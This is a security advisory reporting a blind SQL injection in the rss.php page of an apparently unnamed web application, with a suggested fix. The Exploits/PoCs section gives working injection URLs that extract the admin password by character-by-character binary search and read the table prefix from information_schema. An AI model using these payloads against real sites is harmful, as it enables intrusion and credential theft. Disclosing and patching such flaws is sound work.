- Vulnerability:
####################

+--> Blind SQL Injection
	The RSS page (rss.php) is vulnerable to SQL injection. The GET variable &#039;id&#039; is
	not sanitized correctly in the SQL query. This hole can be used for extracting
	admin password. For details see &#039;Exploits&#039; section.

- Exploits/PoCs:
####################

+--> Exploiting The (MySQL) Blind SQL Injection:
	The GET parameter &#039;id&#039; can be used for SQL injections while the other GET parameter &#039;t&#039;
	be equal with &#039;vp&#039; in the rss.php file.
	The general SQL injection vector will be like this:
	<url-to-site>/rss.php?t=vp&id=0&#039;or(EXISTS
           (SELECT * FROM otatf_users WHERE username=&#039;admin&#039; AND SUBSTR(password,i,1)<&#039;?&#039;)) --&#039;

	In the above vector &#039;id&#039; is used to indicate the ID of the posts which must be returned
	and (since there is no post with id of zero) the total query will be true (and the
	resulting RSS page will not be empty) iff the subquery be true. Using above vector and
	binary searching on &#039;?&#039; for each character &#039;i&#039;, the password of user admin can be extracted.

	following vector for this purpose:
	<url-to-site>/rss.php?t=vp&id=0&#039;or(EXISTS
           (SELECT * FROM (SELECT SUBSTRING(TABLE_NAME,1,LENGTH(TABLE_NAME)-8) AS PREFIX
                           FROM information_schema.TABLES where TABLE_SCHEMA=DATABASE() LIMIT 1) AS TMP
                     WHERE SUBSTR(PREFIX,i,1)<"?")) --&#039;

- Solution:
####################

Remove rss.php and wait for bug fixation by vendor or escape GET parameter in file rss.php using the
vendor string escaping function &#039;quote_smart&#039; as is used in all of other files else of this one.
